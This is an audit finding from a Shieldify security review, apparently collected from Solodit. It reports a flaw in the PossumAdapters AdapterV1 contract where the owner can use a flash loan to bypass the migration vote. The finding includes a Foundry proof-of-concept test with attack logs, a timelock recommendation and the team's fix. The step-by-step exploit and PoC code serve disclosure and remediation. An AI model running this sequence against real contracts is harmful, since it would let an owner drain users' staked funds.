---
# Core Classification
protocol: Possumadapters
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 44155
audit_firm: Shieldify
contest_link: none
source_link: https://github.com/shieldify-security/audits-portfolio-md/blob/main/PossumAdapters-Security-Review.md
github_link: none

# Impact Classification
severity: low
impact: security_vulnerability
exploitability: 0.00
financial_impact: low

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

# Audit Details
report_date: unknown
finders_count: 1
finders:
  - Shieldify Security
---

## Vulnerability Title

[L-06] The Owner Can Bypass the Voting Process to Steal All Users Funds

### Overview

See description below for full details.

### Original Finding Content

## Severity

Low Risk

## Reported By

[elhajin](https://twitter.com/el_hajin)

## Description

The `AdapterV1` contract allows the owner to unilaterally migrate all staked funds to a new contract without going through the voting process.

## Impact

The owner can bypass the intended democratic migration process, which requires a majority of staked capital to vote for migration. By exploiting this vulnerability, the owner can redirect all staked funds and non-claimed portal energy to a malicious contract, effectively stealing assets from users.

## Attack Scenario

1. The owner takes a flash loan of the principal token, acquiring an amount greater than the **total staked balance** in the `AdapterV1` contract.
2. The owner stakes the borrowed tokens through the `AdapterV1` contract, gaining a majority stake (more than 50%).
3. The owner calls `proposeMigrationDestination()` with a malicious contract address / personal address.
4. The owner then calls `acceptMigrationDestination()` to accept the migration to the malicious contract.
5. The NFT representing the staked position in the `PortalV2MultiAsset` contract is minted to the owner, who can now redeem it for all users' funds and then repay the flash loan.

The owner does not need to interact with the old adapter anymore since they control the NFT in the portal itself, which holds the staked funds.

- NOTE: All of the steps can be done in one transaction.

## Proof of Concept

```solidity
function test_PoC() public {
    // Alice stakes some tokens
    uint256 amount = 1e9;
    help_setAllowances();
    vm.startPrank(alice);
    principal_USDC.approve(address(adapter_USDC), amount);
    adapter_USDC.stake(amount);
    vm.stopPrank();

    // simulate taking flashloan by the owner
    address owner = adapter_USDC.OWNER();
    address richWallet = 0xd89b79f10523119d5B467d43EFe0A7710AE2d2AB;
    vm.prank(richWallet);
    principal_USDC.transfer(owner, 1e10);
    vm.startPrank(owner);
    console.log("balance  staked before attack : %e", 1e10);
    principal_USDC.approve(address(adapter_USDC), 1e10);
    adapter_USDC.stake(1e10);
    // propose an address to migrate
    adapter_USDC.proposeMigrationDestination(owner);
    // vote for this address
    adapter_USDC.acceptMigrationDestination();
    // reedem the nft from the portal
    portal_USDC.redeemNFTposition(1);
    // unstake
    (,, uint256 stakedBalance,,,,) = portal_USDC.getUpdateAccount(owner, 0, true);
    console.log("balance  after attack : %e", stakedBalance);
}
```

- Logs :

```sh
Logs:
  balance  staked before attack: 1e10
  balance  after attack: 1.1e10
```

- In this scenario, the owner steals all of Alice's funds without going through a voting process.

## Location of Affected Code

File: [src/AdapterV1.sol#L108](https://github.com/shieldify-security/SPP-Adapters/blob/335351b51a87ce3d20ea471d0f686776ce7d2393/src/AdapterV1.sol#L108)

File: [src/AdapterV1.sol#L117](https://github.com/shieldify-security/SPP-Adapters/blob/335351b51a87ce3d20ea471d0f686776ce7d2393/src/AdapterV1.sol#L117)

## Recommendation

Implement a Timelock mechanism to prevent immediate migration after a proposal, allowing users time to review and respond to proposed changes.

## Team Response

Fixed by implementing a 7-day Timelock.

### Metadata

| Field | Value |
|-------|-------|
| Impact | LOW |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Shieldify |
| Protocol | Possumadapters |
| Report Date | N/A |
| Finders | Shieldify Security |

### Source Links

- **Source**: https://github.com/shieldify-security/audits-portfolio-md/blob/main/PossumAdapters-Security-Review.md
- **GitHub**: N/A
- **Contest**: N/A

### Keywords for Search

`vulnerability`

